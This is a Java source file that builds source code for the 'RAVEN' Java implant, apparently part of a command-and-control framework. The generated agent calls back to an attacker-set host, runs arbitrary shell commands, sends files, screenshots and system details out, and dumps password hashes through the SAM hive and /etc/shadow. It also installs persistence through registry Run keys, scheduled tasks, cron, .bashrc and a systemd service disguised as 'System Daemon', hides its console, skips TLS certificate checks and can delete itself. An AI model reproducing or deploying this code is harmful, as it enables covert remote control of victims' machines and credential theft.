package com.raven.utils;

public final class AgentSourceGen {

    private AgentSourceGen() {}

    public static String Generate(String AgentId, String Host, int Port, String Mode, boolean Persist, boolean HideConsole, String KeystorePassword) {
        return JavaAgent(AgentId, Host, Port, Mode.toLowerCase(), Persist, HideConsole, KeystorePassword);
    }

    public static String Filename() {
        return "RavenAgent.java";
    }

    public static String Ext() {
        return "java";
    }

    // ── Legacy shim — called from Start.java GenerateAgent() ────────────────
    public static String Generate(String Lang, String AgentId, String Host, int Port, boolean Mtls, boolean Persist, boolean HideConsole) {
        String ResolvedMode = Mtls ? "mtls" : "raw";
        return JavaAgent(AgentId, Host, Port, ResolvedMode, Persist, HideConsole, "raven");
    }

    public static String Filename(String Lang) {
        return "RavenAgent.java";
    }

    public static String Ext(String Lang) {
        return "java";
    }

    // ── Core Java Agent ─────────────────────────────────────────────────────

    private static String JavaAgent(String AgentId, String Host, int Port, String Mode, boolean Persist, boolean HideConsole, String KeystorePassword) {
        boolean UseTls = Mode.equals("tls") || Mode.equals("mtls") || Mode.equals("fmtls");
        boolean UseMtls = Mode.equals("mtls") || Mode.equals("fmtls");
        boolean UseHttp = Mode.equals("http") || Mode.equals("beacon");
        boolean UseHttps = Mode.equals("https") || Mode.equals("beacons");
        boolean UseBeacon = UseHttp || UseHttps;
        boolean UseRaw = Mode.equals("raw") || Mode.equals("multi") || (!UseTls && !UseBeacon);

        String NL = "\n";
        String Q = "\"";
        StringBuilder Code = new StringBuilder();

        Code.append("// ════════════════════════════════════════════════════════════════════════").append(NL);
        Code.append("// RAVEN Agent — Java Implant").append(NL);
        Code.append("// Agent ID   : ").append(AgentId).append(NL);
        Code.append("// Server     : ").append(Host).append(":").append(Port).append(NL);
        Code.append("// Mode       : ").append(Mode.toUpperCase()).append(NL);
        Code.append("// Persist    : ").append(Persist).append(NL);
        Code.append("// Hide       : ").append(HideConsole).append(NL);
        Code.append("//").append(NL);
        Code.append("// Compile    : javac RavenAgent.java").append(NL);
        Code.append("// Run        : java RavenAgent").append(NL);
        if (UseMtls) Code.append("// mTLS note  : keep agent.p12 + ca.p12 in same directory").append(NL);
        Code.append("// ════════════════════════════════════════════════════════════════════════").append(NL);
        Code.append(NL);

        Code.append("import java.io.*;").append(NL);
        Code.append("import java.net.*;").append(NL);
        Code.append("import java.nio.charset.StandardCharsets;").append(NL);
        Code.append("import java.security.KeyStore;").append(NL);
        Code.append("import java.util.*;").append(NL);
        Code.append("import javax.net.ssl.*;").append(NL);
        if (UseBeacon) {
            Code.append("import java.net.http.*;").append(NL);
            Code.append("import java.time.Duration;").append(NL);
        }
        Code.append(NL);

        Code.append("public class RavenAgent {").append(NL);
        Code.append(NL);
        Code.append("    static final String  HOST       = ").append(Q).append(Host).append(Q).append(";").append(NL);
        Code.append("    static final int     PORT       = ").append(Port).append(";").append(NL);
        Code.append("    static final String  AGENT_ID   = ").append(Q).append(AgentId).append(Q).append(";").append(NL);
        Code.append("    static final String  MODE       = ").append(Q).append(Mode.toUpperCase()).append(Q).append(";").append(NL);
        Code.append("    static final boolean PERSIST    = ").append(Persist).append(";").append(NL);
        Code.append("    static final boolean HIDE       = ").append(HideConsole).append(";").append(NL);
        Code.append("    static final String  KS_PASS    = ").append(Q).append(KeystorePassword).append(Q).append(";").append(NL);
        Code.append("    static final int     SLEEP_MS   = 5000;").append(NL);
        Code.append("    static final int     CMD_TIMEOUT_MS = 30000;").append(NL);
        Code.append(NL);
        Code.append("    static volatile boolean Running = true;").append(NL);
        Code.append(NL);

        // OS detection
        Code.append("    static final boolean IS_WINDOWS = System.getProperty(\"os.name\", \"\").toLowerCase().contains(\"win\");").append(NL);
        Code.append("    static final String  SHELL_BIN  = IS_WINDOWS ? \"cmd.exe\"  : \"/bin/sh\";").append(NL);
        Code.append("    static final String  SHELL_FLAG = IS_WINDOWS ? \"/c\"       : \"-c\";").append(NL);
        Code.append(NL);

        // main
        Code.append("    public static void main(String[] Args) throws Exception {").append(NL);
        if (HideConsole) Code.append("        HideConsole();").append(NL);
        Code.append("        Runtime.getRuntime().addShutdownHook(new Thread(() -> Running = false));").append(NL);
        Code.append("        do {").append(NL);
        Code.append("            try {").append(NL);
        if (UseBeacon) Code.append("                RunBeacon();").append(NL);
        else Code.append("                RunSocket();").append(NL);
        Code.append("            } catch (Exception Ex) {").append(NL);
        Code.append("                if (PERSIST) Thread.sleep(SLEEP_MS);").append(NL);
        Code.append("            }").append(NL);
        Code.append("        } while (PERSIST && Running);").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);

        // Beacon JSON
        Code.append("    static String Beacon() throws Exception {").append(NL);
        Code.append("        String Hostname = InetAddress.getLocalHost().getHostName();").append(NL);
        Code.append("        long   Pid      = ProcessHandle.current().pid();").append(NL);
        Code.append("        return \"{\"").append(NL);
        Code.append("            + \"\\\"Type\\\":\\\"RAVEN\\\",\"").append(NL);
        Code.append("            + \"\\\"ID\\\":\\\"\"    + AGENT_ID + \"\\\",\"").append(NL);
        Code.append("            + \"\\\"Mode\\\":\\\"\"  + MODE     + \"\\\",\"").append(NL);
        Code.append("            + \"\\\"OS\\\":\\\"\"    + System.getProperty(\"os.name\")    + \"\\\",\"").append(NL);
        Code.append("            + \"\\\"Arch\\\":\\\"\"  + System.getProperty(\"os.arch\")    + \"\\\",\"").append(NL);
        Code.append("            + \"\\\"User\\\":\\\"\"  + System.getProperty(\"user.name\")  + \"\\\",\"").append(NL);
        Code.append("            + \"\\\"Host\\\":\\\"\"  + Hostname + \"\\\",\"").append(NL);
        Code.append("            + \"\\\"Pid\\\":\\\"\"   + Pid      + \"\\\"\"").append(NL);
        Code.append("            + \"}\";").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);

        // Execute command
        Code.append("    static String Execute(String Command) {").append(NL);
        Code.append("        try {").append(NL);
        Code.append("            ProcessBuilder Builder = new ProcessBuilder(SHELL_BIN, SHELL_FLAG, Command);").append(NL);
        Code.append("            Builder.redirectErrorStream(true);").append(NL);
        Code.append("            Process Process = Builder.start();").append(NL);
        Code.append("            byte[] Output = Process.getInputStream().readAllBytes();").append(NL);
        Code.append("            boolean Finished = Process.waitFor(CMD_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS);").append(NL);
        Code.append("            if (!Finished) { Process.destroyForcibly(); return \"[timeout]\"; }").append(NL);
        Code.append("            return Output.length > 0 ? new String(Output, StandardCharsets.UTF_8) : \"[ok]\";").append(NL);
        Code.append("        } catch (Exception Ex) {").append(NL);
        Code.append("            return \"[error] \" + Ex.getMessage();").append(NL);
        Code.append("        }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);

        // RAW / TLS socket mode
        if (UseRaw || UseTls) {
            Code.append("    static void RunSocket() throws Exception {").append(NL);
            Code.append("        Socket Connection = ")
                .append(UseMtls ? "MtlsSocket()" : UseTls ? "TlsSocket()" : "new Socket(HOST, PORT)")
                .append(";")
                .append(NL);
            Code.append("        try {").append(NL);
            Code.append("            PrintStream   Output = new PrintStream(Connection.getOutputStream(), true, StandardCharsets.UTF_8);").append(NL);
            Code.append("            BufferedReader Input  = new BufferedReader(new InputStreamReader(Connection.getInputStream(), StandardCharsets.UTF_8));").append(NL);
            Code.append("            Output.println(Beacon());").append(NL);
            Code.append("            String Line;").append(NL);
            Code.append("            while (Running && (Line = Input.readLine()) != null) {").append(NL);
            Code.append("                Line = Line.trim();").append(NL);
            Code.append("                if (Line.isEmpty()) continue;").append(NL);
            Code.append("                if (Line.equalsIgnoreCase(\"exit\") || Line.equalsIgnoreCase(\"quit\")) break;").append(NL);
            Code.append("                String Result = DispatchCommand(Line);").append(NL);
            Code.append("                Output.print(Result);").append(NL);
            Code.append("                Output.print(\"\\u0000\");").append(NL);
            Code.append("                Output.flush();").append(NL);
            Code.append("            }").append(NL);
            Code.append("        } finally {").append(NL);
            Code.append("            try { Connection.close(); } catch (Exception Ignored) {}").append(NL);
            Code.append("        }").append(NL);
            Code.append("    }").append(NL);
            Code.append(NL);

            if (UseTls && !UseMtls) {
                Code.append("    static Socket TlsSocket() throws Exception {").append(NL);
                Code.append("        SSLContext Context = SSLContext.getInstance(\"TLS\");").append(NL);
                Code.append("        Context.init(null, new TrustManager[]{ new X509TrustManager() {").append(NL);
                Code.append("            public void checkClientTrusted(java.security.cert.X509Certificate[] C, String A) {}").append(NL);
                Code.append("            public void checkServerTrusted(java.security.cert.X509Certificate[] C, String A) {}").append(NL);
                Code.append("            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }").append(NL);
                Code.append("        }}, new java.security.SecureRandom());").append(NL);
                Code.append("        return Context.getSocketFactory().createSocket(HOST, PORT);").append(NL);
                Code.append("    }").append(NL);
                Code.append(NL);
            }

            if (UseMtls) {
                Code.append("    static Socket MtlsSocket() throws Exception {").append(NL);
                Code.append("        KeyStore AgentKeystore = KeyStore.getInstance(\"PKCS12\");").append(NL);
                Code.append("        AgentKeystore.load(new FileInputStream(\"agent.p12\"), KS_PASS.toCharArray());").append(NL);
                Code.append("        KeyStore CaKeystore = KeyStore.getInstance(\"PKCS12\");").append(NL);
                Code.append("        CaKeystore.load(new FileInputStream(\"ca.p12\"), KS_PASS.toCharArray());").append(NL);
                Code.append("        KeyManagerFactory   KeyManager   = KeyManagerFactory.getInstance(\"SunX509\");").append(NL);
                Code.append("        TrustManagerFactory TrustManager = TrustManagerFactory.getInstance(\"SunX509\");").append(NL);
                Code.append("        KeyManager.init(AgentKeystore, KS_PASS.toCharArray());").append(NL);
                Code.append("        TrustManager.init(CaKeystore);").append(NL);
                Code.append("        SSLContext Context = SSLContext.getInstance(\"TLS\");").append(NL);
                Code.append("        Context.init(KeyManager.getKeyManagers(), TrustManager.getTrustManagers(), null);").append(NL);
                Code.append("        return Context.getSocketFactory().createSocket(HOST, PORT);").append(NL);
                Code.append("    }").append(NL);
                Code.append(NL);
            }
        }

        // HTTP/HTTPS beacon mode
        if (UseBeacon) {
            Code.append("    static String BeaconSession = null;").append(NL);
            Code.append(NL);
            Code.append("    static void RunBeacon() throws Exception {").append(NL);
            Code.append("        String BaseUrl = \"")
                .append(UseHttps ? "https" : "http")
                .append("://\" + HOST + \":\" + PORT;")
                .append(NL);
            Code.append("        HttpClient Client = HttpClient.newBuilder()").append(NL);
            Code.append("            .connectTimeout(Duration.ofSeconds(10))").append(NL);
            if (UseHttps) Code.append("            .sslContext(InsecureSsl())").append(NL);
            Code.append("            .build();").append(NL);
            Code.append("        // Register").append(NL);
            Code.append("        HttpRequest Register = HttpRequest.newBuilder()").append(NL);
            Code.append("            .uri(URI.create(BaseUrl + \"/beacon/register\"))").append(NL);
            Code.append("            .header(\"Content-Type\", \"application/json\")").append(NL);
            Code.append("            .POST(HttpRequest.BodyPublishers.ofString(Beacon()))").append(NL);
            Code.append("            .build();").append(NL);
            Code.append("        HttpResponse<String> RegResponse = Client.send(Register, HttpResponse.BodyHandlers.ofString());").append(NL);
            Code.append("        BeaconSession = ExtractField(RegResponse.body(), \"session\");").append(NL);
            Code.append("        // Poll loop").append(NL);
            Code.append("        while (Running) {").append(NL);
            Code.append("            Thread.sleep(SLEEP_MS);").append(NL);
            Code.append("            HttpRequest Poll = HttpRequest.newBuilder()").append(NL);
            Code.append("                .uri(URI.create(BaseUrl + \"/beacon/poll?session=\" + BeaconSession))").append(NL);
            Code.append("                .GET().build();").append(NL);
            Code.append("            HttpResponse<String> PollResponse = Client.send(Poll, HttpResponse.BodyHandlers.ofString());").append(NL);
            Code.append("            String Command = ExtractField(PollResponse.body(), \"cmd\");").append(NL);
            Code.append("            if (Command == null || Command.isBlank()) continue;").append(NL);
            Code.append("            if (Command.equalsIgnoreCase(\"exit\")) break;").append(NL);
            Code.append("            String Result = DispatchCommand(Command);").append(NL);
            Code.append("            String ResultJson = \"{\\\"session\\\":\\\"\" + BeaconSession + \"\\\",\\\"output\\\":\" + JsonEscape(Result) + \"}\";").append(NL);
            Code.append("            HttpRequest Submit = HttpRequest.newBuilder()").append(NL);
            Code.append("                .uri(URI.create(BaseUrl + \"/beacon/result\"))").append(NL);
            Code.append("                .header(\"Content-Type\", \"application/json\")").append(NL);
            Code.append("                .POST(HttpRequest.BodyPublishers.ofString(ResultJson))").append(NL);
            Code.append("                .build();").append(NL);
            Code.append("            Client.send(Submit, HttpResponse.BodyHandlers.ofString());").append(NL);
            Code.append("        }").append(NL);
            Code.append("    }").append(NL);
            Code.append(NL);
            if (UseHttps) {
                Code.append("    static SSLContext InsecureSsl() throws Exception {").append(NL);
                Code.append("        SSLContext Context = SSLContext.getInstance(\"TLS\");").append(NL);
                Code.append("        Context.init(null, new TrustManager[]{ new X509TrustManager() {").append(NL);
                Code.append("            public void checkClientTrusted(java.security.cert.X509Certificate[] C, String A) {}").append(NL);
                Code.append("            public void checkServerTrusted(java.security.cert.X509Certificate[] C, String A) {}").append(NL);
                Code.append("            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }").append(NL);
                Code.append("        }}, new java.security.SecureRandom());").append(NL);
                Code.append("        return Context;").append(NL);
                Code.append("    }").append(NL);
                Code.append(NL);
            }
            Code.append("    static String ExtractField(String Json, String Field) {").append(NL);
            Code.append("        if (Json == null) return null;").append(NL);
            Code.append("        String Key = \"\\\"\" + Field + \"\\\":\\\"\";").append(NL);
            Code.append("        int Start = Json.indexOf(Key);").append(NL);
            Code.append("        if (Start < 0) return null;").append(NL);
            Code.append("        Start += Key.length();").append(NL);
            Code.append("        int End = Json.indexOf('\"', Start);").append(NL);
            Code.append("        return End > Start ? Json.substring(Start, End) : null;").append(NL);
            Code.append("    }").append(NL);
            Code.append(NL);
            Code.append("    static String JsonEscape(String Value) {").append(NL);
            Code.append("        if (Value == null) return \"\\\"\\\"\";").append(NL);
            Code.append("        return \"\\\"\" + Value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"\\\"\", \"\\\\\\\"\").replace(\"\\n\", \"\\\\n\").replace(\"\\r\", \"\") + \"\\\"\";").append(NL);
            Code.append("    }").append(NL);
            Code.append(NL);
        }

        // DispatchCommand — cross-platform raven: protocol handler
        Code.append("    static String DispatchCommand(String Command) {").append(NL);
        Code.append("        if (Command.startsWith(\"raven:\")) {").append(NL);
        Code.append("            return HandleRavenProtocol(Command.substring(6));").append(NL);
        Code.append("        }").append(NL);
        Code.append("        return Execute(Command);").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);

        // raven: protocol handler
        Code.append("    static String HandleRavenProtocol(String Directive) {").append(NL);
        Code.append("        String[] Parts   = Directive.split(\":\", 2);").append(NL);
        Code.append("        String   Command  = Parts[0].toLowerCase();").append(NL);
        Code.append("        String   Argument = Parts.length > 1 ? Parts[1] : \"\";").append(NL);
        Code.append("        return switch (Command) {").append(NL);
        Code.append("            case \"ping\"        -> \"[pong] \" + AGENT_ID;").append(NL);
        Code.append("            case \"reconnect\"   -> { Running = false; yield \"[reconnecting]\"; }").append(NL);
        Code.append("            case \"selfdestruct\"-> { SelfDestruct(); yield \"[terminated]\"; }").append(NL);
        Code.append("            case \"sleep\"       -> { return SetSleep(Argument); }").append(NL);
        Code.append("            case \"jitter\"      -> \"[ok] jitter noted (client-side)\";").append(NL);
        Code.append("            case \"screenshot\"  -> TakeScreenshot();").append(NL);
        Code.append("            case \"download\"    -> ReadFile(Argument);").append(NL);
        Code.append("            case \"upload\"      -> WriteFile(Argument);").append(NL);
        Code.append("            case \"keylog\"      -> \"[keylog] not implemented in basic agent\";").append(NL);
        Code.append("            case \"hashdump\"    -> DumpHashes();").append(NL);
        Code.append("            case \"browserdump\" -> \"[browserdump] not implemented in basic agent\";").append(NL);
        Code.append("            case \"spawn\"       -> SpawnAgent();").append(NL);
        Code.append("            case \"migrate\"     -> \"[migrate] not supported in pure-Java agent\";").append(NL);
        Code.append("            case \"portfwd\"     -> \"[portfwd] not implemented in basic agent\";").append(NL);
        Code.append("            case \"socks\"       -> \"[socks] not implemented in basic agent\";").append(NL);
        Code.append("            case \"pivot\"       -> \"[pivot] not implemented in basic agent\";").append(NL);
        Code.append("            case \"persist\"     -> InstallPersistence(Argument);").append(NL);
        Code.append("            case \"unpersist\"   -> RemovePersistence(Argument);").append(NL);
        Code.append("            default             -> \"[unknown raven directive] \" + Command;").append(NL);
        Code.append("        };").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);

        // Helper methods
        Code.append("    static String SetSleep(String Argument) {").append(NL);
        Code.append("        try { Thread.sleep(Long.parseLong(Argument.trim()) * 1000L); return \"[ok]\"; }").append(NL);
        Code.append("        catch (Exception Ignored) { return \"[error] invalid sleep value\"; }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static void SelfDestruct() {").append(NL);
        Code.append("        Running = false;").append(NL);
        Code.append("        try {").append(NL);
        Code.append("            String SelfPath = RavenAgent.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();").append(NL);
        Code.append("            if (IS_WINDOWS) Execute(\"del /f /q \\\"\" + SelfPath + \"\\\"\");").append(NL);
        Code.append("            else            Execute(\"rm -f \\\"\" + SelfPath + \"\\\"\");").append(NL);
        Code.append("        } catch (Exception Ignored) {}").append(NL);
        Code.append("        System.exit(0);").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static String TakeScreenshot() {").append(NL);
        Code.append("        try {").append(NL);
        Code.append("            java.awt.Robot Robot = new java.awt.Robot();").append(NL);
        Code.append("            java.awt.Rectangle Screen = new java.awt.Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize());").append(NL);
        Code.append("            java.awt.image.BufferedImage Image = Robot.createScreenCapture(Screen);").append(NL);
        Code.append("            ByteArrayOutputStream Buffer = new ByteArrayOutputStream();").append(NL);
        Code.append("            javax.imageio.ImageIO.write(Image, \"png\", Buffer);").append(NL);
        Code.append("            return \"[screenshot:base64] \" + Base64.getEncoder().encodeToString(Buffer.toByteArray());").append(NL);
        Code.append("        } catch (Exception Ex) { return \"[error] \" + Ex.getMessage(); }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static String ReadFile(String Path) {").append(NL);
        Code.append("        try {").append(NL);
        Code.append("            byte[] Data = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(Path.trim()));").append(NL);
        Code.append("            return \"[file:base64] \" + Base64.getEncoder().encodeToString(Data);").append(NL);
        Code.append("        } catch (Exception Ex) { return \"[error] \" + Ex.getMessage(); }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static String WriteFile(String Argument) {").append(NL);
        Code.append("        try {").append(NL);
        Code.append("            String[] Parts = Argument.split(\" \", 2);").append(NL);
        Code.append("            if (Parts.length < 2) return \"[error] usage: upload <path> <base64data>\";").append(NL);
        Code.append("            byte[] Data = Base64.getDecoder().decode(Parts[1].trim());").append(NL);
        Code.append("            java.nio.file.Files.write(java.nio.file.Paths.get(Parts[0].trim()), Data);").append(NL);
        Code.append("            return \"[ok] written \" + Data.length + \" bytes to \" + Parts[0];").append(NL);
        Code.append("        } catch (Exception Ex) { return \"[error] \" + Ex.getMessage(); }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static String DumpHashes() {").append(NL);
        Code.append("        if (IS_WINDOWS) return Execute(\"reg save HKLM\\\\SAM sam.bak 2>&1 && echo SAM saved\");").append(NL);
        Code.append("        else            return Execute(\"cat /etc/shadow 2>/dev/null || echo permission denied\");").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static String SpawnAgent() {").append(NL);
        Code.append("        try {").append(NL);
        Code.append("            String Cmd = IS_WINDOWS").append(NL);
        Code.append("                ? \"javaw -cp . RavenAgent\"").append(NL);
        Code.append("                : \"java -cp . RavenAgent &\";").append(NL);
        Code.append("            Execute(Cmd);").append(NL);
        Code.append("            return \"[ok] spawned\";").append(NL);
        Code.append("        } catch (Exception Ex) { return \"[error] \" + Ex.getMessage(); }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static String InstallPersistence(String Method) {").append(NL);
        Code.append("        String AgentPath;").append(NL);
        Code.append("        try { AgentPath = new File(\"RavenAgent.class\").getAbsolutePath(); }").append(NL);
        Code.append("        catch (Exception Ex) { AgentPath = \"RavenAgent.class\"; }").append(NL);
        Code.append("        if (IS_WINDOWS) {").append(NL);
        Code.append("            return switch (Method.toLowerCase()) {").append(NL);
        Code.append("                case \"registry\" -> Execute(\"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v RavenAgent /t REG_SZ /d \\\"javaw -cp . RavenAgent\\\" /f\");").append(NL);
        Code.append("                case \"schtask\"  -> Execute(\"schtasks /create /tn RavenAgent /tr \\\"javaw -cp . RavenAgent\\\" /sc onlogon /f\");").append(NL);
        Code.append("                default         -> Execute(\"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v RavenAgent /t REG_SZ /d \\\"javaw -cp . RavenAgent\\\" /f\");").append(NL);
        Code.append("            };").append(NL);
        Code.append("        } else {").append(NL);
        Code.append("            return switch (Method.toLowerCase()) {").append(NL);
        Code.append("                case \"cron\"     -> Execute(\"(crontab -l 2>/dev/null; echo '@reboot cd \" + new File(AgentPath).getParent() + \" && java RavenAgent') | crontab -\");").append(NL);
        Code.append("                case \"bashrc\"   -> Execute(\"echo 'java -cp . RavenAgent &' >> ~/.bashrc\");").append(NL);
        Code.append("                case \"systemd\"  -> WriteSystemdService();").append(NL);
        Code.append("                default         -> Execute(\"(crontab -l 2>/dev/null; echo '@reboot java -cp . RavenAgent') | crontab -\");").append(NL);
        Code.append("            };").append(NL);
        Code.append("        }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static String WriteSystemdService() {").append(NL);
        Code.append("        String ServiceContent =").append(NL);
        Code.append("            \"[Unit]\\nDescription=System Daemon\\nAfter=network.target\\n\" +").append(NL);
        Code.append("            \"[Service]\\nExecStart=java -cp . RavenAgent\\nRestart=always\\n\" +").append(NL);
        Code.append("            \"[Install]\\nWantedBy=default.target\\n\";").append(NL);
        Code.append("        try {").append(NL);
        Code.append("            String ServicePath = System.getProperty(\"user.home\") + \"/.config/systemd/user/raven.service\";").append(NL);
        Code.append("            new File(ServicePath).getParentFile().mkdirs();").append(NL);
        Code.append("            java.nio.file.Files.writeString(java.nio.file.Paths.get(ServicePath), ServiceContent);").append(NL);
        Code.append("            Execute(\"systemctl --user enable raven.service\");").append(NL);
        Code.append("            Execute(\"systemctl --user start raven.service\");").append(NL);
        Code.append("            return \"[ok] systemd service installed\";").append(NL);
        Code.append("        } catch (Exception Ex) { return \"[error] \" + Ex.getMessage(); }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        Code.append("    static String RemovePersistence(String Method) {").append(NL);
        Code.append("        if (IS_WINDOWS) {").append(NL);
        Code.append("            return switch (Method.toLowerCase()) {").append(NL);
        Code.append("                case \"registry\" -> Execute(\"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v RavenAgent /f\");").append(NL);
        Code.append("                case \"schtask\"  -> Execute(\"schtasks /delete /tn RavenAgent /f\");").append(NL);
        Code.append("                default         -> Execute(\"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v RavenAgent /f\");").append(NL);
        Code.append("            };").append(NL);
        Code.append("        } else {").append(NL);
        Code.append("            return Execute(\"crontab -l 2>/dev/null | grep -v RavenAgent | crontab -; systemctl --user disable raven.service 2>/dev/null; rm -f ~/.config/systemd/user/raven.service\");").append(NL);
        Code.append("        }").append(NL);
        Code.append("    }").append(NL);
        Code.append(NL);
        if (HideConsole) {
            Code.append("    static void HideConsole() {").append(NL);
            Code.append("        if (IS_WINDOWS) try {").append(NL);
            Code.append("            Class<?> Kernel = Class.forName(\"com.sun.jna.platform.win32.Kernel32\");").append(NL);
            Code.append("            Object Instance = Kernel.getField(\"INSTANCE\").get(null);").append(NL);
            Code.append("            Kernel.getMethod(\"FreeConsole\").invoke(Instance);").append(NL);
            Code.append("        } catch (Exception Ignored) {}").append(NL);
            Code.append("    }").append(NL);
            Code.append(NL);
        }
        Code.append("}").append(NL);

        return Code.toString();
    }
}
